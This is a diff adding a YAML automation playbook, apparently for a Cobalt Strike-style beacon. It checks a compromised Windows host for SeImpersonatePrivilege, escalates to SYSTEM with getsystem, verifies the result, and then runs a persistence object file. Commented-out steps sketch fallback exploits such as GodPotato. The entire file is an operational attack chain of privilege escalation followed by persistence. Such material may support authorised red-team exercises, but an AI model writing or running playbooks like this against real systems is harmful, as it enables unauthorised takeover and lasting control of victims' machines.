@@ -1,0 +1,55 @@
+name: SeImpersonate Privilege Escalation
+# beacon_id: "YOUR_BEACON_ID"
+
+actions:
+  # Step 1: Run whoami BOF to check privileges
+  - name: whoami_check
+    type: bof_string
+    parameters:
+      bof: /opt/bofs/CS-Situational-Awareness-BOF/SA/whoami/whoami.x64.o
+      entrypoint: go
+      #arguments: ""
+  - name: try_getsystem
+    type: getsystem
+    conditions:
+      - type: output_check
+        source: whoami_check
+        operator: contains
+        value: SeImpersonatePrivilege
+        case_sensitive: false
+    on_success:
+      # Verify we got SYSTEM
+      - name: verify_elevation
+        type: getuid
+
+
+
+
+      # Run additional post-exploitation tasks
+      - name: post_exploit
+        type: bof_string
+        parameters:
+          bof: /opt/bofs/persistence.o
+          entrypoint: go
+          arguments: ""
+
+    # on_failure:
+    #   # If GodPotato fails, try alternative methods
+    #   - name: try_getsystem
+    #     type: getsystem
+    #     on_success:
+    #       - name: verify_getsystem
+    #         type: getuid
+
+  # # Step 3: If no SeImpersonatePrivilege, try other exploits
+  # - name: alternative_exploit
+  #   type: bof_string
+  #   parameters:
+  #     bof: /opt/bofs/alternative_privesc.o
+  #     entrypoint: go
+  #   conditions:
+  #     - type: output_check
+  #       source: whoami_check
+  #       operator: not_contains
+  #       value: SeImpersonatePrivilege
+  #       case_sensitive: false
